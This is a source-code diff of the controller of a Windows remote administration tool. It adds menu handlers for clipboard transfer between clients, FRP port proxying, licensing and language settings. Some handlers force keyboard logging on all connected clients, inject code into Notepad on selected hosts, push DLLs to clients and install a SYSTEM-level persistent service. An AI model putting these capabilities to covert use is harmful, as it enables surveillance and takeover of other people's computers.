+                        Mprintf("【Ctrl+V】 [C2C] 通知目标准备: %s, transferID=%llu, src=%llu\n",
+                            dstScreen->m_IPAddress, req.transferID, srcClientID);
+
+                        // 发送请求到源客户端，让它发送剪贴板文件到目标客户端
+                        if (srcScreen->m_ContextObject->Send2Client((BYTE*)&req, sizeof(req))) {
+                            Mprintf("【Ctrl+V】 [C2C] 远程 %s -> 远程 %s, transferID=%llu\n",
+                                srcScreen->m_IPAddress, dstScreen->m_IPAddress, req.transferID);
+                            // C2C 传输已处理，阻止按键传递到目标客户端
+                            return 1;
+                        } else {
+                            Mprintf("【Ctrl+V】 [C2C] 发送请求失败\n");
+                        }
+                    } else if (g_2015RemoteDlg->GetActiveRemoteSession() && !dlg && remoteCtrlCTime > 0 &&
+                        (time(nullptr) - remoteCtrlCTime < 60) && remoteCtrlCTime > localCtrlCTime) {
+                        // 远程 -> 本地：有活动会话，当前不在远程窗口，60秒内在远程按过Ctrl+C，且比本地Ctrl+C更晚
                         auto screen = (CScreenSpyDlg*)(g_2015RemoteDlg->GetActiveRemoteSession());
                         if (!screen) {
-							Mprintf("【Ctrl+V】 [远程 -> 本地] 远程桌面窗口状态已经失效\n");
-							break;
+                            Mprintf("【Ctrl+V】 [远程 -> 本地] 远程桌面窗口状态已经失效\n");
+                            break;
                         }
                         if (!screen->m_bIsCtrl) {
                             Mprintf("【Ctrl+V】 [远程 -> 本地] 窗口不是控制状态: %s\n", screen->m_IPAddress);
@@ -4665,8 +8461,8 @@ LRESULT CMy2015RemoteDlg::OnSessionActivatedMsg(WPARAM wParam, LPARAM lParam)
 
 void CMy2015RemoteDlg::OnToolReloadPlugins()
 {
-    if (IDYES!=MessageBoxL("请将64位的DLL放于主控程序的 'Plugins' 目录，是否继续?"
-                           "\n执行未经测试的代码可能造成程序崩溃。", "提示", MB_ICONINFORMATION | MB_YESNO))
+    if (IDYES!=MessageBoxL(_L("请将64位的DLL放于主控程序的 'Plugins' 目录，是否继续?")+
+                           _L("\n执行未经测试的代码可能造成程序崩溃。"), "提示", MB_ICONINFORMATION | MB_YESNO))
         return;
     char path[_MAX_PATH];
     GetModuleFileNameA(NULL, path, _MAX_PATH);
@@ -4741,9 +8537,12 @@ void CMy2015RemoteDlg::OnParamKblogger()
 {
     m_settings.EnableKBLogger = !m_settings.EnableKBLogger;
     CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
-    SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
+    if (SubMenu)
+        SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
     THIS_CFG.SetInt("settings", "KeyboardLog", m_settings.EnableKBLogger);
-    SendMasterSettings(nullptr);
+    SendMasterSettings(nullptr, m_settings);
+    MessageBoxA(m_settings.EnableKBLogger ? _TR("所有客户端的键盘记录被强制启用。") : _TR("客户端的键盘记录需要单独打开。"), 
+        _TR("提示"), MB_ICONINFORMATION);
 }
 
 
@@ -4754,7 +8553,8 @@ void CMy2015RemoteDlg::OnOnlineInjNotepad()
     POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
     while (Pos) {
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-        context* ctx = (context*)m_CList_Online.GetItemData(iItem);
+        context* ctx = GetContextByListIndex(iItem);
+        if (!ctx) continue;
         if (!ctx->IsLogin())
             continue;
         Buffer* buf = tinyRun->Data;
@@ -4770,7 +8570,9 @@ void CMy2015RemoteDlg::OnParamLoginNotify()
     m_needNotify = !m_needNotify;
     THIS_CFG.SetInt("settings", "LoginNotify", m_needNotify);
     CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
-    SubMenu->CheckMenuItem(ID_PARAM_LOGIN_NOTIFY, m_needNotify ? MF_CHECKED : MF_UNCHECKED);
+    if (SubMenu)
+        SubMenu->CheckMenuItem(ID_PARAM_LOGIN_NOTIFY, m_needNotify ? MF_CHECKED : MF_UNCHECKED);
+    MessageBoxA(m_needNotify ? _TR("已启用客户端上线通知。") : _TR("已关闭客户端上线通知。"), _TR("提示"), MB_ICONINFORMATION);
 }
 
 
@@ -4778,11 +8580,91 @@ void CMy2015RemoteDlg::OnParamEnableLog()
 {
     m_settings.EnableLog = !m_settings.EnableLog;
     CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
-    SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
+    if (SubMenu)
+        SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
     THIS_CFG.SetInt("settings", "EnableLog", m_settings.EnableLog);
-    SendMasterSettings(nullptr);
+    SendMasterSettings(nullptr, m_settings);
+    MessageBoxA(m_settings.EnableLog ? _TR("已启用客户端日志。") : _TR("已关闭客户端日志。"), _TR("提示"), MB_ICONINFORMATION);
 }
 
+void CMy2015RemoteDlg::OnParamPrivacyWallpaper()
+{
+    CFileDialog dlg(TRUE, _T("bmp"), NULL,
+        OFN_FILEMUSTEXIST | OFN_HIDEREADONLY,
+        _T("BMP Files (*.bmp)|*.bmp|All Files (*.*)|*.*||"), this);
+
+    if (dlg.DoModal() == IDOK) {
+        CString path = dlg.GetPathName();
+
+        // 验证文件是否可以读取
+        CFile file;
+        if (!file.Open(path, CFile::modeRead | CFile::typeBinary)) {
+            MessageBox(_TR("无法读取指定的BMP文件，请检查文件是否存在或权限是否正确。"),
+                _TR("错误"), MB_ICONERROR);
+            return;
+        }
+
+        // 验证是否是有效的BMP文件
+        BITMAPFILEHEADER bmfh;
+        if (file.Read(&bmfh, sizeof(bmfh)) != sizeof(bmfh) || bmfh.bfType != 0x4D42) {
+            file.Close();
+            MessageBox(_TR("指定的文件不是有效的BMP格式。"),
+                _TR("错误"), MB_ICONERROR);
+            return;
+        }
+        file.Close();
+
+        m_PrivateScreenWallpaper = path;
+        THIS_CFG.SetStr("settings", "Wallpaper", path.GetString());
+        auto SubMenu = m_MainMenu.GetSubMenu(2);  // 工具菜单
+        if (SubMenu) {
+            SubMenu->CheckMenuItem(ID_PARAM_PRIVACY_WALLPAPER, MF_CHECKED);
+        }
+        CString msg;
+        msg.Format(_TR("隐私屏幕壁纸已设置为:\n%s"), path);
+        MessageBox(msg + CString("\n") + _L("如需恢复默认值，请从磁盘移除该文件。"), _TR("设置成功"), MB_ICONINFORMATION);
+    }
+}
+
+void CMy2015RemoteDlg::OnParamFileV2()
+{
+    m_bEnableFileV2 = !m_bEnableFileV2;
+    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
+    if (SubMenu)
+        SubMenu->CheckMenuItem(ID_PARAM_FILE_V2, m_bEnableFileV2 ? MF_CHECKED : MF_UNCHECKED);
+    THIS_CFG.SetInt("settings", "EnableFileV2", m_bEnableFileV2 ? 1 : 0);
+    Mprintf("文件传输V2: %s\n", m_bEnableFileV2 ? "启用" : "禁用");
+    MessageBoxA(m_bEnableFileV2 ? _TR("已启用文件传输协议V2，支持断点续传和C2C传输。") : _TR("已关闭文件传输协议V2。"), 
+        _TR("提示"), MB_ICONINFORMATION);
+}
+
+void CMy2015RemoteDlg::OnParamRunAsUser()
+{
+    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
+
+    if (m_runNormal == 2) {
+        // 切换到服务+SYSTEM模式
+        m_runNormal = 0;
+        THIS_CFG.SetInt("settings", "RunNormal", m_runNormal);
+        if (SubMenu) {
+            SubMenu->CheckMenuItem(ID_PARAM_RUN_AS_USER, MF_UNCHECKED);
+            SubMenu->CheckMenuItem(ID_RUNAS_SERVICE, MF_CHECKED);
+        }
+        MessageBoxL("已切换为SYSTEM权限模式，请重启程序生效。", "提示", MB_ICONINFORMATION);
+    } else {
+        // 切换到服务+User模式
+        m_runNormal = 2;
+        THIS_CFG.SetInt("settings", "RunNormal", m_runNormal);
+        if (SubMenu) {
+            SubMenu->CheckMenuItem(ID_PARAM_RUN_AS_USER, MF_CHECKED);
+            SubMenu->CheckMenuItem(ID_RUNAS_SERVICE, MF_UNCHECKED);
+        }
+        MessageBoxL(_L("已切换为用户权限模式，请重启程序生效。\n\n")+
+                    _L("以用户身份运行代理可解决输入法(IME)和剪切板文件列表等问题，但可能影响某些需要高权限的功能。"),
+                    "提示", MB_ICONINFORMATION);
+    }
+    BOOL r = m_runNormal == 1 ? ServerService_Uninstall() : ServerService_Install();
+}
 
 bool IsDateGreaterOrEqual(const char* date1, const char* date2)
 {
@@ -4846,60 +8728,70 @@ std::string GetAuthKey(const char* token, long long timestamp)
 // 例如代理3389端口，即可通过 mstsc.exe 进行远程访问
 void CMy2015RemoteDlg::ProxyClientTcpPort(bool isStandard)
 {
-	BOOL useFrp = THIS_CFG.GetInt("frp", "UseFrp", 0);
-	std::string pwd = THIS_CFG.GetStr("frp", "token", "");
-	std::string ip = THIS_CFG.GetStr("settings", "master", "");
-	if (!useFrp || pwd.empty() || ip.empty()) {
-		MessageBoxL("需要正确启用FRP反向代理方可使用此功能!", "提示", MB_ICONINFORMATION);
-		return;
-	}
+    BOOL useFrp = THIS_CFG.GetInt("frp", "UseFrp", 0);
+    std::string pwd = THIS_CFG.GetStr("frp", "token", "");
+    std::string ip = GetFirstMasterIP(THIS_CFG.GetStr("settings", "master", ""));
+    if (!useFrp || pwd.empty() || ip.empty()) {
+        MessageBoxL("需要正确启用FRP反向代理方可使用此功能!", "提示", MB_ICONINFORMATION);
+        return;
+    }
 
-	if (!isStandard && IDYES != MessageBoxL("如果没有定制的FRPS服务端程序，请勿点击此菜单! 是否继续?", "提示", MB_YESNO))
-		return;
-	if (isStandard && IDYES != MessageBoxL("此功能会将FRP的token传递到客户端使用，谨慎操作! 是否继续?", "提示", MB_YESNO))
-		return;
+    if (!isStandard && IDYES != MessageBoxL("如果没有定制的FRPS服务端程序，请勿点击此菜单! 是否继续?", "提示", MB_YESNO))
+        return;
+    if (isStandard && IDYES != MessageBoxL("此功能会将FRP的token传递到客户端使用，谨慎操作! 是否继续?", "提示", MB_YESNO))
+        return;
 
-	CInputDialog dlg(this);
-	dlg.Init(_TR("代理端口"), _TR("请输入客户端端口:"));
-	if (IDOK != dlg.DoModal() || atoi(dlg.m_str) <= 0 || atoi(dlg.m_str) >= 65536) {
-		return;
+    CInputDialog dlg(this);
+    dlg.Init(_TR("代理端口"), _TR("请输入客户端端口:"));
+    dlg.Init2(_TR("访问端口(默认同上):"), "");
+    if (IDOK != dlg.DoModal() || atoi(dlg.m_str) <= 0 || atoi(dlg.m_str) >= 65536) {
+        return;
+    }
+    if (atoi(dlg.m_sSecondInput) <= 0 || atoi(dlg.m_sSecondInput) >= 65536) {
+		dlg.m_sSecondInput = dlg.m_str;
 	}
-	uint64_t timestamp = time(nullptr);
-	std::string key = isStandard ? pwd : GetAuthKey(pwd.c_str(), timestamp);
-	int serverPort = THIS_CFG.GetInt("frp", "server_port", 7000);
-	int localPort = atoi(dlg.m_str);
-	auto frpc = ReadFrpcDll(isStandard ? CALLTYPE_FRPC_STDCALL : CALLTYPE_FRPC_CALL);
-	FrpcParam param(key.c_str(), timestamp, ip.c_str(), serverPort, localPort, localPort);
-	EnterCriticalSection(&m_cs);
-	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
-	BOOL sent = FALSE;
+    uint64_t timestamp = time(nullptr);
+    std::string key = isStandard ? pwd : GetAuthKey(pwd.c_str(), timestamp);
+    int serverPort = THIS_CFG.GetInt("frp", "server_port", 7000);
+    int localPort = atoi(dlg.m_str), remotePort = atoi(dlg.m_sSecondInput);
+    auto frpc = ReadFrpcDll(isStandard ? CALLTYPE_FRPC_STDCALL : CALLTYPE_FRPC_CALL);
+    FrpcParam param(key.c_str(), timestamp, ip.c_str(), serverPort, localPort, remotePort);
+    EnterCriticalSection(&m_cs);
+    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+    BOOL sent = FALSE;
     const char* validDate = isStandard ? "Jan 29 2026" : "Dec 22 2025";
-	while (Pos) {
-		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-		context* ctx = (context*)m_CList_Online.GetItemData(iItem);
-		if (!ctx->IsLogin())
-			continue;
-		CString date = ctx->GetClientData(ONLINELIST_VERSION);
-		if (IsDateGreaterOrEqual(date, validDate)) {
-			Buffer* buf = frpc->Data;
-			BYTE cmd[1 + sizeof(DllExecuteInfoNew)] = { 0 };
-			memcpy(cmd, buf->Buf(), 1 + sizeof(DllExecuteInfoNew));
-			DllExecuteInfoNew* p = (DllExecuteInfoNew*)(cmd + 1);
-			SetParameters(p, (char*)&param, sizeof(param));
-			ctx->Send2Client(cmd, 1 + sizeof(DllExecuteInfoNew));
-			sent = TRUE;
-		}
-		else {
-			PostMessageA(WM_SHOWNOTIFY, (WPARAM)new CharMsg(_L("版本不支持")),
-				(LPARAM)new CharMsg(_L("客户端版本最低要求: ") + CString(validDate)));
-		}
-		break;
-	}
-	LeaveCriticalSection(&m_cs);
-	SAFE_DELETE(frpc);
-	if (sent)
-		MessageBoxL(_L("请通过") + "[" + ip.c_str() + ":" + std::to_string(localPort).c_str() + "]" + _L("访问代理端口!"),
-			"提示", MB_ICONINFORMATION);
+    while (Pos) {
+        int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
+        context* ctx = GetContextByListIndex(iItem);
+        if (!ctx) continue;
+        if (!ctx->IsLogin())
+            continue;
+        CString bits = ctx->GetAdditionalData(RES_PROGRAM_BITS);
+        if (bits != "64")
+            continue;
+        CString os = ctx->GetClientData(ONLINELIST_OS);
+        if (os == "Windows 7" || os == "Windows 8" || os == "Windows 8.1")
+            continue;
+        CString date = ctx->GetClientData(ONLINELIST_VERSION);
+        if (IsDateGreaterOrEqual(date, validDate)) {
+            Buffer* buf = frpc->Data;
+            BYTE cmd[1 + sizeof(DllExecuteInfoNew)] = { 0 };
+            memcpy(cmd, buf->Buf(), 1 + sizeof(DllExecuteInfoNew));
+            DllExecuteInfoNew* p = (DllExecuteInfoNew*)(cmd + 1);
+            SetParameters(p, (char*)&param, sizeof(param));
+            ctx->Send2Client(cmd, 1 + sizeof(DllExecuteInfoNew));
+            sent = TRUE;
+        } else {
+            PostMessageA(WM_SHOWNOTIFY, (WPARAM)new CharMsg(_L("版本不支持")),
+                         (LPARAM)new CharMsg(_L("客户端版本最低要求: ") + CString(validDate)));
+        }
+        break;
+    }
+    LeaveCriticalSection(&m_cs);
+    SAFE_DELETE(frpc);
+    if (sent)
+        MessageBoxL(_L("请通过") + "[" + ip.c_str() + ":" + dlg.m_sSecondInput + "]" + _L("访问代理端口!"),
+                    "提示", MB_ICONINFORMATION);
 }
 
 void CMy2015RemoteDlg::OnProxyPort()
@@ -4917,24 +8809,41 @@ void CMy2015RemoteDlg::OnProxyPortStd()
 void CMy2015RemoteDlg::OnHookWin()
 {
     m_bHookWIN = !m_bHookWIN;
-    MessageBoxL(_L("远程控制时，") + (m_bHookWIN ? "" : "不") + _L("转发系统热键到远程桌面。"),
+    MessageBoxL(_L("远程控制时，") + (m_bHookWIN ? "" : _L("不")) + _L("转发系统热键到远程桌面。"),
                 "提示", MB_ICONINFORMATION);
     THIS_CFG.SetInt("settings", "HookWIN", m_bHookWIN);
     CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
-    SubMenu->CheckMenuItem(ID_HOOK_WIN, m_bHookWIN ? MF_CHECKED : MF_UNCHECKED);
+    if (SubMenu)
+        SubMenu->CheckMenuItem(ID_HOOK_WIN, m_bHookWIN ? MF_CHECKED : MF_UNCHECKED);
 }
 
 
 void CMy2015RemoteDlg::OnRunasService()
 {
-    m_runNormal = !m_runNormal;
-    MessageBoxL(m_runNormal ? _L("以传统方式启动主控程序，没有守护进程。") :
-                _L("以“服务+代理”形式启动主控程序，会开机自启及被守护。"),
-                "提示", MB_ICONINFORMATION);
-    THIS_CFG.SetInt("settings", "RunNormal", m_runNormal);
     CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
-    SubMenu->CheckMenuItem(ID_RUNAS_SERVICE, !m_runNormal ? MF_CHECKED : MF_UNCHECKED);
-    BOOL r = m_runNormal ? ServerService_Uninstall() : ServerService_Install();
+
+    if (m_runNormal == 0) {
+        // 切换到普通模式
+        m_runNormal = 1;
+        THIS_CFG.SetInt("settings", "RunNormal", m_runNormal);
+        if (SubMenu) {
+            SubMenu->CheckMenuItem(ID_RUNAS_SERVICE, MF_UNCHECKED);
+            SubMenu->CheckMenuItem(ID_PARAM_RUN_AS_USER, MF_UNCHECKED);
+        }
+        MessageBoxL(_L("以传统方式启动主控程序，没有守护进程。"), "提示", MB_ICONINFORMATION);
+    } else {
+        // 切换到服务+SYSTEM模式
+        m_runNormal = 0;
+        THIS_CFG.SetInt("settings", "RunNormal", m_runNormal);
+        if (SubMenu) {
+            SubMenu->CheckMenuItem(ID_RUNAS_SERVICE, MF_CHECKED);
+            SubMenu->CheckMenuItem(ID_PARAM_RUN_AS_USER, MF_UNCHECKED);
+        }
+        MessageBoxL(_L("以“服务+代理”形式启动主控程序，会开机自启及被守护。") +
+                    _L("\n代理程序将以SYSTEM权限运行。请重启程序生效。"),
+                    "提示", MB_ICONINFORMATION);
+    }
+    BOOL r = m_runNormal == 1 ? ServerService_Uninstall() : ServerService_Install();
 }
 
 void CMy2015RemoteDlg::OnHistoryClients()
@@ -4958,8 +8867,8 @@ void CMy2015RemoteDlg::OnHistoryClients()
 
 void CMy2015RemoteDlg::OnBackupData()
 {
-    MessageBoxL("如果更换主控IP，必须将主机迁移到新的主控IP名下。注意，更换主控程序的机器可能导致授权失效!"
-        "请将数据库文件拷贝到目标机器，否则将丢失全部备注信息。", "提示", MB_ICONINFORMATION);
+    MessageBoxL(_L("如果更换主控IP，必须将主机迁移到新的主控IP名下。注意，更换主控程序的机器可能导致授权失效!")+
+                _L("请将数据库文件拷贝到目标机器，否则将丢失全部备注信息。"), "提示", MB_ICONINFORMATION);
     std::filesystem::path path = GetDbPath();
     std::filesystem::path dir = path.parent_path();
     ShellExecuteW(NULL, L"open", dir.c_str(), NULL, NULL, SW_SHOWNORMAL);
@@ -4967,7 +8876,13 @@ void CMy2015RemoteDlg::OnBackupData()
 
 void CMy2015RemoteDlg::OnPluginRequest()
 {
-    TODO_NOTICE;
+    CString content = THIS_CFG.GetStr("settings", "GetPluginUrl", BRAND_URL_GET_PLUGIN).c_str();
+    if (content.Left(4).CompareNoCase(_T("http")) == 0) {
+        ShellExecute(NULL, _T("open"), content, NULL, NULL, SW_SHOWNORMAL);
+    }
+    else {
+        MessageBoxL(content, _TR("获取插件"), MB_ICONINFORMATION);
+    }
 }
 
 void CMy2015RemoteDlg::OnChangeLang()
@@ -4975,7 +8890,7 @@ void CMy2015RemoteDlg::OnChangeLang()
     size_t count = g_Lang.GetLanguageCount();
     if (count == 1) {
         // 只有简体中文，提示用户
-        MessageBoxA(_T("未检测到其他语言文件，请将语言文件放入 lang 目录!"), "提示", MB_ICONINFORMATION);
+        MessageBoxL("未检测到其他语言文件，请将语言文件放入 lang 目录!", "提示", MB_ICONINFORMATION);
         return;
     }
 
@@ -4988,7 +8903,7 @@ void CMy2015RemoteDlg::OnChangeLang()
         // 用户选择了语言
         g_Lang.Load(langCode);
 
-        // 保存到配置文件 
+        // 保存到配置文件
         THIS_CFG.SetStr("settings", "Language", langCode.GetString());
 
         // 提示用户重启生效
@@ -5001,30 +8916,28 @@ void CMy2015RemoteDlg::OnChooseLangDir()
     CFolderPickerDialog folderDlg(THIS_CFG.GetStr("settings", "LangDir", "./lang").c_str(), NULL, this, 0);
     CString strTitle = _TR("请选择目录");
     folderDlg.m_ofn.lpstrTitle = strTitle;
-	if (folderDlg.DoModal() == IDOK)
-	{
-		CString folderPath = folderDlg.GetPathName();
+    if (folderDlg.DoModal() == IDOK) {
+        CString folderPath = folderDlg.GetPathName();
 
-		auto lang = THIS_CFG.GetStr("settings", "Language", "en_US");
-		THIS_CFG.SetStr("settings", "LangDir", folderPath.GetString());
-		g_Lang.Init(folderPath);
-		g_Lang.Load(lang.c_str());
+        auto lang = THIS_CFG.GetStr("settings", "Language", "en_US");
+        THIS_CFG.SetStr("settings", "LangDir", folderPath.GetString());
+        g_Lang.Init(folderPath);
+        g_Lang.Load(lang.c_str());
         MessageBoxL("目录已选择，可能需要重启程序。", "提示", MB_ICONINFORMATION);
-	}
+    }
 }
 
 
 void CMy2015RemoteDlg::OnImportData()
 {
-    if (IDOK!=MessageBoxL("导入主控程序的历史主机记录。此操作会覆盖本机的历史记录，请仅在迁移主控程序时进行操作。"
-        "数据库文件仅用于恢复主机备注信息。是否继续?", "提示",IDOK)) return;
-    CFileDialog fileDlg(TRUE, NULL, "YAMA.db", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
-        _T("YAMA DB (*.db)|*.db|All Files (*.*)|*.*||"), AfxGetMainWnd());
+    if (IDOK!=MessageBoxL(_L("导入主控程序的历史主机记录。此操作会覆盖本机的历史记录，请仅在迁移主控程序时进行操作。")+
+                          _L("数据库文件仅用于恢复主机备注信息。是否继续?"), "提示",IDOK)) return;
+    CFileDialog fileDlg(TRUE, NULL, BRAND_DB_NAME, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
+                        _T(BRAND_APP_NAME " DB (*.db)|*.db|All Files (*.*)|*.*||"), AfxGetMainWnd());
     int ret = 0;
     try {
         ret = fileDlg.DoModal();
-    }
-    catch (...) {
+    } catch (...) {
         MessageBoxL("文件对话框未成功打开! 请稍后再试。", "提示", MB_ICONWARNING);
         return;
     }
@@ -5033,5 +8946,327 @@ void CMy2015RemoteDlg::OnImportData()
         auto backup = GetDbPath() + "." + ToPekingDateTime(0);
         CopyFileA(GetDbPath().c_str(), backup.c_str(), FALSE);
         m_ClientMap->LoadFromFile(name.GetString());
+    }
+}
+
+void CMy2015RemoteDlg::OnLocationQqwry()
+{
+    THIS_CFG.SetInt("settings", "IPLocType", QQWry);
+    CMenu* SubMenu = FindSubMenuByCommand(m_MainMenu.GetSubMenu(3), ID_LOCATION_QQWRY);
+    if (SubMenu) {
+        SubMenu->CheckMenuItem(ID_LOCATION_QQWRY, MF_CHECKED);
+        SubMenu->CheckMenuItem(ID_LOCATION_IP2REGION, MF_UNCHECKED);
+    }
+    MessageBoxL("请确保“qqwry.dat”文件存在! 重启程序生效。", "提示", MB_ICONINFORMATION);
+}
+
+void CMy2015RemoteDlg::OnLocationIp2region()
+{
+    THIS_CFG.SetInt("settings", "IPLocType", Ip2Region);
+    CMenu* SubMenu = FindSubMenuByCommand(m_MainMenu.GetSubMenu(3), ID_LOCATION_QQWRY);
+    if (SubMenu) {
+        SubMenu->CheckMenuItem(ID_LOCATION_QQWRY, MF_UNCHECKED);
+        SubMenu->CheckMenuItem(ID_LOCATION_IP2REGION, MF_CHECKED);
+    }
+    MessageBoxL("请确保“ip2region_v4.xdb”文件存在! 重启程序生效。", "提示", MB_ICONINFORMATION);
+}
+
+void CMy2015RemoteDlg::OnToolLicenseMgr()
+{
+    // 如果对话框已存在，刷新并显示
+    if (m_pLicenseDlg != nullptr && ::IsWindow(m_pLicenseDlg->GetSafeHwnd())) {
+        m_pLicenseDlg->ShowAndRefresh();
+        return;
+    }
+
+    // 创建非模态对话框
+    m_pLicenseDlg = new CLicenseDlg(this);
+    if (m_pLicenseDlg->Create(IDD_DIALOG_LICENSE, GetDesktopWindow())) {
+        m_pLicenseDlg->ShowWindow(SW_SHOW);
+    }
+}
+
+void CMy2015RemoteDlg::OnToolImportLicense()
+{
+    // File filter
+    CString filter = _T(BRAND_LICENSE_DESC " (*.lic)|*.lic|All Files (*.*)|*.*||");
+    CString dlgTitle = _TR("导入授权文件");
+
+    // Show file open dialog
+    CFileDialog dlg(TRUE, _T("lic"), NULL,
+        OFN_FILEMUSTEXIST | OFN_HIDEREADONLY, filter, this);
+    dlg.m_ofn.lpstrTitle = dlgTitle;
+
+    if (dlg.DoModal() != IDOK)
+        return;
+
+    // Import and validate
+    LicenseFileData data;
+    std::string error;
+    LicenseImportResult result = ImportLicenseFile(std::string(CT2A(dlg.GetPathName().GetString())), data, error);
+
+    if (result != LicenseImportResult::Success) {
+        MessageBox(CString(error.c_str()), _TR("导入失败"), MB_ICONERROR);
+        return;
+    }
+
+    // Parse expiry info from password
+    auto parts = splitString(data.password, '-');
+    std::string startDate = parts.size() > 0 ? parts[0] : "";
+    std::string endDate = parts.size() > 1 ? parts[1] : "";
+    std::string hostNum = parts.size() > 2 ? parts[2] : "";
+
+    // Format date for display (YYYYMMDD -> YYYY-MM-DD)
+    auto formatDate = [](const std::string& d) -> std::string {
+        if (d.length() == 8) {
+            return d.substr(0, 4) + "-" + d.substr(4, 2) + "-" + d.substr(6, 2);
+        }
+        return d;
+    };
+
+    // Show confirmation dialog
+    CString msg;
+    msg.Format(_T("%s\n\n%s: %s\n%s: %s ~ %s\n%s: %s\n%s: %s\n\n%s"),
+               _TR("确定导入以下授权?"),
+               _TR("序列号"), CString(data.sn.c_str()).GetString(),
+               _TR("有效期"), CString(formatDate(startDate).c_str()).GetString(),
+               CString(formatDate(endDate).c_str()).GetString(),
+               _TR("并发数"), CString(hostNum.c_str()).GetString(),
+               _TR("授权类型"), data.IsV2Auth() ? _T("V2 (ECDSA)") : _T("V1 (HMAC)"),
+               _TR("导入后需要重启程序生效"));
+
+    if (MessageBox(msg, _TR("确认导入"), MB_YESNO | MB_ICONQUESTION) != IDYES)
+        return;
+
+    // Apply license
+    if (ApplyLicenseData(data)) {
+        MessageBoxL("授权已导入，请重启程序生效。", "导入成功", MB_ICONINFORMATION);
+    } else {
+        MessageBoxL("授权信息不完整", "导入失败", MB_ICONERROR);
+    }
+}
+
+void CMy2015RemoteDlg::OnToolV2PrivateKey()
+{
+    if (GetMasterHash() != GetPwdHash())
+        return;
+
+    int ret = MessageBoxL("注意：仅授权管理员需要设置 V2 私钥！设置不匹配的私钥将导致签名无效。\n\n"
+                          "是否继续？",
+                          "V2 私钥设置", MB_YESNO | MB_ICONWARNING);
+    if (ret != IDYES) return;
+
+    CFileDialog dlg(TRUE, _T("key"), nullptr,
+                    OFN_FILEMUSTEXIST | OFN_HIDEREADONLY,
+                    _T("Key Files (*.key;*.pem)|*.key;*.pem|All Files (*.*)|*.*||"),
+                    this);
+    dlg.m_ofn.lpstrTitle = _T("Select V2 Private Key");
+
+    // 如果已有配置，设置初始目录
+    std::string existingPath = m_v2KeyPath;
+    CString initialDir;
+    if (!existingPath.empty()) {
+        initialDir = existingPath.c_str();
+        int pos = initialDir.ReverseFind('\\');
+        if (pos > 0) initialDir = initialDir.Left(pos);
+        dlg.m_ofn.lpstrInitialDir = initialDir;
+    }
+
+    if (dlg.DoModal() == IDOK) {
+        CString path = dlg.GetPathName();
+		m_v2KeyPath = path.GetString();
+        THIS_CFG.SetStr("settings", "V2PrivateKey", path.GetString());
+
+        // 显示消息
+        std::string msg = "V2 Private Key: " + std::string(path.GetString());
+        CharMsg* cm = new CharMsg(msg.c_str());
+        PostMessageA(WM_SHOWMESSAGE, (WPARAM)cm, NULL);
+
+        // 更新菜单勾选状态
+        CMenu* SubMenu = m_MainMenu.GetSubMenu(1);
+        if (SubMenu) {
+            SubMenu->CheckMenuItem(ID_TOOL_V2_PRIVATEKEY, MF_CHECKED);
+        }
+    }
+}
+
+void CMy2015RemoteDlg::OnMenuNotifySettings()
+{
+    NotifySettingsDlg dlg(this);
+    dlg.DoModal();
+}
+
+void CMy2015RemoteDlg::OnFrpsForSub()
+{
+    CFrpsForSubDlg dlg(this);
+    if (dlg.DoModal() == IDOK) {
+        // 配置变更后更新状态栏显示
+        UpdateStatusBarStats();
+    }
+}
+
+// Helper function to convert string to lowercase for case-insensitive comparison
+static std::string ToLowerCase(const std::string& str) {
+    std::string result = str;
+    std::transform(result.begin(), result.end(), result.begin(), ::tolower);
+    return result;
+}
+
+void CMy2015RemoteDlg::OnOnlineLoginNotify()
+{
+    // Get selected hosts and add their computer name/remark to notify keywords
+    std::vector<std::string> hostsToAdd;
+
+    EnterCriticalSection(&m_cs);
+    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+    while (Pos) {
+        int iItem = m_CList_Online.GetNextSelectedItem(Pos);
+        context* ctx = GetContextByListIndex(iItem);
+        if (!ctx) continue;
+
+        // Prefer remark, fallback to computer name
+        CString remark = m_ClientMap->GetClientMapData(ctx->GetClientID(), MAP_NOTE);
+        CString hostName;
+        if (!remark.IsEmpty()) {
+            hostName = remark;
+        } else {
+            hostName = ctx->GetClientData(ONLINELIST_COMPUTER_NAME);
+        }
+
+        if (!hostName.IsEmpty()) {
+            // Convert to UTF-8
+            std::string nameUtf8 = CT2A(hostName, CP_UTF8);
+            hostsToAdd.push_back(nameUtf8);
+        }
+    }
+    LeaveCriticalSection(&m_cs);
+
+    if (hostsToAdd.empty()) {
+        return;
+    }
+
+    // Get current config and add new keywords
+    NotifyConfig config = GetNotifyManager().GetConfig();
+    NotifyRule& rule = config.GetRule();
+
+    // Parse existing keywords into a set for deduplication (case-insensitive)
+    std::set<std::string> existingKeywordsLower;  // lowercase for comparison
+    std::vector<std::string> existingKeywords;     // original case for output
+    std::string pattern = rule.matchPattern;
+    size_t pos = 0;
+    while ((pos = pattern.find(';')) != std::string::npos) {
+        std::string kw = pattern.substr(0, pos);
+        // Trim whitespace
+        size_t start = kw.find_first_not_of(" \t");
+        size_t end = kw.find_last_not_of(" \t");
+        if (start != std::string::npos) {
+            std::string trimmed = kw.substr(start, end - start + 1);
+            existingKeywordsLower.insert(ToLowerCase(trimmed));
+            existingKeywords.push_back(trimmed);
+        }
+        pattern.erase(0, pos + 1);
+    }
+    // Last keyword (or only keyword if no semicolon)
